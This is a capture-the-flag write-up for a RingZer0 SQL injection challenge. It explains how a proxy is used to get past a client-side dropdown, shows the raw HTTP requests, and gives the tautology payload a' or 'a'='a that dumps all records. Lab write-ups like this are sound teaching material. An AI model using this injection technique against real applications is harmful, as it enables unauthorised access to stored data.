CHALLENGE
Challenge Access list 

SOLUTION
For this challenge, there isn't an input field we can use to enter arbitrary input; only a dropdown menu. This is only a client-side restriction though, and because we control the client, it's not really restricting.

We need to open up a proxy to inspect and change the requests that are sent out to the server. I use Burpsuite.

Once the proxy is set up, we can try to see what happens when we submit "admin" through the website. This is the request that is sent:
POST /challenges/2 HTTP/1.1
Host: ringzer0team.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ringzer0team.com/challenges/2
Cookie: PHPSESSID=evm10n67gbr9fteo3c86242043
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
username=admin

The last line is the most important here. Using our proxy, we can change this to whatever we want and perform SQLi.

The next step is to figure out what query is being run and how we can make it do what we want. It is my guess that there is a record in there somewhere that contains the info we need.

Let's just try to get the page to show us all the records. The query is probably something like:
SELECT username, group, description FROM users WHERE username='$username'

We need to escape that input to make the WHERE-clause true for all records.
$username: a' or 'a'='a

The resulting request is:
POST /challenges/2 HTTP/1.1
Host: ringzer0team.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ringzer0team.com/challenges/2
Cookie: PHPSESSID=evm10n67gbr9fteo3c86242043
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
username=a' or 'a'='a

We now see a list of all records in that table, and among them are several records that contain the flag.
